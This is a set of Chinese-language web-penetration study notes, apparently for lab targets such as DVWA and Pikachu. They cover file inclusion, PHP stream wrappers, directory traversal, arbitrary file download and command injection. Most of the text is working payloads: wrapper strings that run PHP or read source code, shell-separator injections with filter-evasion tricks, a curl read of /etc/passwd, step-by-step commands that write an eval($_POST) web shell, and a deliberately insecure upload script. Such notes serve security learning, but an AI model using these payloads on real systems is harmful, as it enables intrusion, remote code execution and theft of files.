文件包含把它包含的文件当作php文件执行，和文件上传联动include/1.html  单独访问php不解析php代码可能在源代码里include=1.html php执行php.iniallow_url_include=On允许远程文件包含文件包含include include_once require require_once本地文件包含：filename=haha.htmlinclude、include-once、require、require-once这一类的带有“包含”的英文，就可以猜测带有这类漏洞使用http://当前ip/index.php检测是否含有文件包含漏洞如果你文件上传到了一个其他位置，你就需要在当前目录下模拟进入该位置fi_local.php?filename=../../../wiki/haha.html远程文件包含：filename=http://127.0.0.1/haha.html可能会过滤http:// 与../ 使用大小写或者重写过wafhttp://127.0.0.1/index.phphTTp://127.0.0.1/index.php../../index.php都不行可能对文件进行检查并进行file://访问代码：<?php $file = $_GET['file'];include($file);?>允许远程文件包含http://dvwa.com/vulnerabilities/fi/?page=http://www.baidu.comhttp://dvwa.com/vulnerabilities/fi/?page=file://c:/a.txt伪协议：file:// 访问本地文件系统（本地文件是它本地，不是我主机上的文件）http:// 访问http网址（远程文件包含，上传一句话木马）php:// 访问输入输出流（本地文件包含访问，取出并进行base64加密）data:// 访问本地文件，进行php木马访问zlib:// 访问压缩流ftp:// 访问ftp服务器phar:// php归档rar:// 访问rar文件ogg:// 访问音频expect:// 交互式流第一种：防御方法：进行关键字符替换 http:// || ./ ../  (重复解决）通过为协议，查看本地文件源代码进行代码审计php://filter/read=convert.base64-encode/resource=./index.php第二种：强制文件头：filepage=php://inputPOST<?php phpinfo();?>第三种：data://text/plain,<?php phpinfo()?>data://text/plain, <? php system("ls"); ?>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=目录遍历：和文件包含很类似/dir_list.php?title=..//dir_list.php?title=../..//dir_list.php?title=../../../有可能会出现文件夹的图案，让人可以知道网站的目录结构任意文件下载：http://pikachu.com//vul/unsafedownload/execdownload.php?filename=../key.txt需要知道绝对路径，小众漏洞，旁站下载需要vip的东西（想法）命令执行漏洞（RCE--remote command/code execute）系统命令执行函数system exec shell_exec pcntl_exec popen proc_popen passthru读取本地文件、写入一句话木马system shell_exec exec.....ping 127.0.0.1 & ipconfig 几乎同时执行ping 127.0.0.1 && ipconfig 执行完前面取执行后面ping 127.0.0.1 &;& ipconfig ;会被解析为空ping 127.0.0.1 || ipconfig 如果左边正确就不执行右边ping 127.0.0.1 | ipconfig 在linux中叫管道符，把前面的命令的执行结果给后面的命令执行防火墙屏蔽：面对屏蔽ls等关键词，使用'127.0.0.1 | l's' -la(查看文件及权限）有的文件没有权限操作，并且屏蔽了chmod127.0.0.1 | c'h'mod 777 ./123.txt127.0.0.1 | chmo\d 777 ./123.txt查看文件cat 123.txt屏蔽cat tac head tail等命令和'cat：从第一行开始显示内容，显示所有内容tac:和cat相反more:一页页查看内容less：和more类似head:查看头几行tail:查看后几行nl: 类似cat -n,显示行号taillf:类似tail -f127.0.0.1 & sort ./123.txt127.0.0.1| paste ./123.txt直接读取文件127.0.0.1;curl file:// /etc/passwdcurl file://127.0.0.1/etc/passwd屏蔽txt但是要读取123.txt127.0.0.1| c'a't ./123.tx*127.0.0.1| c'a't ./123.tx?屏蔽空格< <> %20 %09 $IFS$9 ${IFS} $IFS127.0.0.1&&tac${IFS}./123.txt> 覆盖>> 追加echo 会换行，在linux里，-e是不换行set /p="xxx" 不换行windows:set /p="<?php " >> z.phpset /p="eval(" >> z.phpset /p="$_POST[1]" >> z.phpset /p=");?>" >> z.phplinux:echo '<?php ' >> z.phpecho -e 'eval(\c' >> z.phpecho -e '$_POST[1]\c' >> z.phpecho -e ');?>\c' >> z.phpecho '<?php eval($_POST[1]);?>' > z.php文件上传变态版：<form action="wjsc.php" method="POST" enctype="multipart/form-data"><input type="file" name="file" /> <input type="submit" name="submit" value="上传"></form><?php  if(isset($_POST['submit'])){if(($_FILES['file']['type']=='image/jpeg')){$temp_file = $_FILES['file']['tmp_name'];//文件名修改 1.php$filename1 = $_FILES['file']['name'];//生成一个1-1000的随机数$number = rand(1,1000);//1.php469$filename2 = $filename1.$number;//579e5004a6935926baa510f134241412$filename3 = md5($filename2);//579e5004a6935926baa510f134241412.php$filename4 = $filename3.".php";$img_path = './'.$filename4;//保存文件if(move_uploaded_file($temp_file, $img_path)){echo '上传成功!自己猜文件名吧！！！！';}else{echo '上传失败';}}else{echo '文件上传格式错误！！';}}?>
